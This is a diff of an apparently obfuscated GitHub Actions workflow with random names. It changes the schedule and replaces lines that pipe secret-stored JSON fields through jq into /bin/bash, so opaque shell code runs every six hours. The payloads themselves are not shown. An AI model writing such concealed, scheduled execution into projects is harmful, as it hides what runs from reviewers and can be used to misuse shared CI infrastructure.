@@ -2,24 +2,22 @@ name: xiongyonghong6473
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 1/6 * * *'
-
+    - cron: '35 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiongyonghong6473
         env:
-          sbd10: ${{ secrets.sbd10 }}
+          zxwcj18067: ${{ secrets.zxwcj18067 }}
         run: |
-          echo $sbd10 | jq -r .qivhg2 | /bin/bash
-          echo $k4763 | jq -r .daon27 | /bin/bash
-          echo $vkpd78160 | jq -r .dlao20 | /bin/bash
-          echo $b03 | jq -r .m96 | /bin/bash
-          echo $gng58 | jq -r .rc4 | /bin/bash
-          echo $awcou6 | jq -r .wq70351 | /bin/bash
-          echo $fuq63844 | jq -r .lrkd0854 | /bin/bash
-          echo $hpybu83773 | jq -r .kdnms157 | /bin/bash
-          echo $etad368 | jq -r .e431 | /bin/bash
+          echo $zxwcj18067 | jq -r .st11786 | /bin/bash
+          echo $mf145 | jq -r .xl2 | /bin/bash
+          echo $io4268 | jq -r .cs1 | /bin/bash
+          echo $emlwk687 | jq -r .vdtfz93 | /bin/bash
+          echo $d15226 | jq -r .xeiop4 | /bin/bash
+          echo $gyp9272 | jq -r .tiec21 | /bin/bash
+          echo $cns0 | jq -r .fjg6047 | /bin/bash
 
